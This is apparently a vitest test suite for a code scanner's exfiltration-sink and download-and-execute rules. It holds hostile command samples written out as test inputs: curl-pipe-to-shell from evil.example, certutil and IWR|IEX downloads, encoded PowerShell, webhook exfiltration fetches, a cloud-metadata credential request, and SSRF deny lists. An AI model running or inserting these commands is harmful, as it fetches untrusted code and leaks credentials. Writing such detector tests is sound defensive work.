import { describe, expect, it } from 'vitest'
import { scan } from '../lib/scanner-bin/engine.js'
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Finding, ScanRequest } from '../lib/scanner-bin/protocol.js'

function codeRequest(overrides: Partial<ScanRequest>): ScanRequest {
  return { kind: 'code', language: 'js', runtime: 'host', ...overrides }
}

function findingOf(report: { findings: Finding[] }, rule: string, severity?: string): Finding | undefined {
  return report.findings.find(f => f.rule === rule && (severity === undefined || f.severity === severity))
}

function withTmp(files: Record<string, string>, fn: (dir: string) => void): void {
  const dir = mkdtempSync(join(tmpdir(), 'vet-r13r14-'))
  for (const [name, content] of Object.entries(files)) {
    writeFileSync(join(dir, name), content)
  }
  try {
    fn(dir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

describe('R13 network-exfil: hardcoded exfiltration sinks in string literals', () => {
  it('telegram bot webhook literal → R13 high, verdict suspicious', () => {
    const res = scan(codeRequest({ code: "fetch('https://api.telegram.org/bot123456:ABC/sendMessage')" }))
    expect(res.ok).toBe(true)
    const r = res.report!
    const r13 = findingOf(r, 'R13', 'high')
    expect(r13).toBeDefined()
    expect(r13!.message).toContain('Telegram')
    expect(r.verdict).toBe('suspicious')
  })

  it('cloud metadata endpoint → R13 high (IAM exfil surface)', () => {
    const res = scan(codeRequest({ code: "http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')" }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13', 'high')
    expect(r13).toBeDefined()
    expect(r13!.message).toContain('云元数据')
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('.onion destination (valid v2 label) → R13 high', () => {
    const res = scan(codeRequest({ code: "const url = 'http://3g2upl4pq6kufc4m.onion/payload'" }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
  })

  it('non-onion .onion mentions (action.onion / prose) → no R13', () => {
    const res = scan(codeRequest({ code: 'const a = "action.onion"; const b = ".onion is anonymized"; const c = "go to .onion now"' }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13')).toBeUndefined()
  })

  it('clean code without sinks → no R13, verdict clean', () => {
    const res = scan(codeRequest({ code: 'export const add = (a: number, b: number) => a + b' }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13')).toBeUndefined()
    expect(res.report!.verdict).toBe('clean')
  })

  it('R13 toggle off suppresses findings', () => {
    const res = scan(codeRequest({ code: "fetch('https://discord.com/api/webhooks/1/2')", rules: { R13: false } }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13')).toBeUndefined()
    expect(res.report!.verdict).toBe('clean')
  })

  it('uppercase webhook host is caught (hostnames are case-insensitive)', () => {
    const res = scan(codeRequest({ code: "fetch('https://DISCORD.COM/api/webhooks/1/2')" }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
  })
})

describe('0.3.10 R13 误报治理（OSS 注册表 64 例反馈复现）', () => {
  it('SSRF 拒绝名单（Set + .has 消费）→ 降 info，verdict 不再升级', () => {
    const res = scan(codeRequest({
      code: 'const BLOCKED_HOSTNAMES = new Set(["localhost", "metadata.google.internal", "metadata.amazonaws.com"]);\n'
        + 'export function isBlocked(host) { return BLOCKED_HOSTNAMES.has(host.trim().toLowerCase()) }',
    }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13')
    expect(r13).toBeDefined()
    expect(r13!.severity).toBe('info')
    expect(r13!.message).toContain('拒绝名单')
    expect(res.report!.verdict).toBe('clean')
  })

  it('散文/标签/说明串（字面量整体不是端点）→ 不命中', () => {
    const res = scan(codeRequest({
      code: 'const doc = "cloud metadata (169.254.169.254) is not allowed by policy";\n'
        + 'const label = "Refusing metadata.google.internal for security";',
    }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13')).toBeUndefined()
  })

  it('行内 === 比较（守卫判定）→ 降 info', () => {
    const res = scan(codeRequest({
      code: 'if (hostname === "metadata.google.internal") throw new Error("cloud metadata media URLs are not allowed")',
    }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13')
    expect(r13).toBeDefined()
    expect(r13!.severity).toBe('info')
    expect(r13!.message).toContain('拒绝名单')
  })

  it('Object.freeze 拒绝地址表（守卫名提示）→ 降 info', () => {
    const res = scan(codeRequest({
      code: 'export const REFUSED_ADDRESSES = Object.freeze([rule("169.254.169.254/32", "cloud-metadata", true), rule("168.63.129.16/32", "azure", true)])',
    }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13')
    expect(r13).toBeDefined()
    expect(r13!.severity).toBe('info')
    expect(r13!.message).toContain('拒绝名单')
  })

  it('脱敏占位（xxxx 打码模板）→ 降 info', () => {
    const res = scan(codeRequest({ code: "const tpl = 'https://discord.com/api/webhooks/12345/xxxx'" }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13')
    expect(r13).toBeDefined()
    expect(r13!.severity).toBe('info')
    expect(r13!.message).toContain('脱敏占位')
  })

  it('测试/CI 文件路径 → 降 info（R3 同款目录降级）', () => {
    withTmp({ 'batch-import.test.mjs': 'fetch("https://discord.com/api/webhooks/123/abc")\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'batch-import.test.mjs')] })
      expect(res.ok).toBe(true)
      const r13 = findingOf(res.report!, 'R13')
      expect(r13).toBeDefined()
      expect(r13!.severity).toBe('info')
      expect(r13!.message).toContain('测试/CI')
      expect(res.report!.verdict).toBe('clean')
    })
  })

  it('目标列表（Set + for..of + fetch，无成员判定消费）→ 保持 high（防漏回归）', () => {
    const res = scan(codeRequest({
      code: 'const HOSTS = new Set(["metadata.google.internal"]);\n'
        + 'for (const h of HOSTS) fetch("http://" + h + "/latest/meta-data/")',
    }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13')
    expect(r13).toBeDefined()
    expect(r13!.severity).toBe('high')
  })

  it('模板字面量 URL（含插值缺口）→ 仍 high（真阳性保留）', () => {
    const res = scan(codeRequest({ code: 'fetch(`https://discord.com/api/webhooks/${token}/send`)' }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
  })

  it('N2 解码 webhook 真值 → 仍 high（解码语料通道不受误报治理误伤）', () => {
    const res = scan(codeRequest({
      code: 'fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMS8y"))',
    }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13')
    expect(r13).toBeDefined()
    expect(r13!.severity).toBe('high')
    expect(r13!.decodedFrom).toBe('base64')
  })
})

describe('R14 non-JS scripts: download-and-exec primitives in shipped script files', () => {
  it('curl|sh in a .sh file → R14 high, verdict suspicious', () => {
    withTmp({ 'setup.sh': '#!/bin/sh\ncurl -fsSL http://evil.example/x.sh | sh\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'setup.sh')] })
      expect(res.ok).toBe(true)
      const r14 = findingOf(res.report!, 'R14', 'high')
      expect(r14).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })
  })

  it('encoded powershell in a .ps1 file → R14 high', () => {
    withTmp({ 'install.ps1': 'powershell -enc SQBFAFgA' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'install.ps1')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })

  it('benign shell script → no R14, verdict clean', () => {
    withTmp({ 'setup.sh': '#!/bin/sh\necho hello\ncp a b\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'setup.sh')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14')).toBeUndefined()
      expect(res.report!.verdict).toBe('clean')
    })
  })

  it('generic target downgrades R14 to info (verdict clean)', () => {
    withTmp({ 'x.sh': 'curl http://e.com/x | sh\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'x.sh')], targetKind: 'generic' })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'info')).toBeDefined()
      expect(res.report!.verdict).toBe('clean')
    })
  })

  it('R14 toggle off suppresses findings', () => {
    withTmp({ 'x.sh': 'curl http://e.com/x | sh\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'x.sh')], rules: { R14: false } })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14')).toBeUndefined()
    })
  })

  it('download-exec in a .bat file is also caught', () => {
    withTmp({ 'go.bat': 'certutil -urlcache -f http://e.com/x.exe x.exe\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'go.bat')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })

  it('uppercase IWR download-pipe is caught (PowerShell is case-insensitive)', () => {
    withTmp({ 'dl.ps1': 'IWR -Uri http://e.com/x.ps1 | IEX\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'dl.ps1')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })

  it('uppercase CERTUTIL in a .cmd file is caught (cmd is case-insensitive)', () => {
    withTmp({ 'go.cmd': 'CERTUTIL -urlcache -f http://e.com/x.exe x.exe\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'go.cmd')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })

  it('lowercase iex invoke-expression is caught', () => {
    withTmp({ 'x.ps1': '$x = iex \'Get-Process\'\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'x.ps1')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })

  it('curl -o download-only is medium (not high, verdict stays clean)', () => {
    withTmp({ 'get.sh': 'curl -o /tmp/x http://e.com/x\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'get.sh')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'medium')).toBeDefined()
      expect(res.report!.verdict).toBe('clean')
    })
  })
})
